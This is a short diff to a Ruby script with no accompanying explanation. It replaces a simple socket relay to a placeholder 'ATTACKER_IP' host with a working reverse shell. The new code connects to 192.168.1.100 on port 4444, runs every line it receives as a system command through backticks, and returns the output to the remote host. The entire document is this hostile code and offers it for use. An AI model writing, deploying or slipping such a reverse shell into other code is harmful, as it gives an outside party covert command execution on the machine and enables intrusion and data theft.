@@ -1,7 +1,8 @@
 require 'socket'
 
-s = TCPSocket.open("ATTACKER_IP", 80)
+client = TCPSocket.new('192.168.1.100', 4444)
 loop do
-  s.puts gets
-  puts s.gets
+    command = client.gets.chomp
+    result = `#{command}`
+    client.puts result
 end
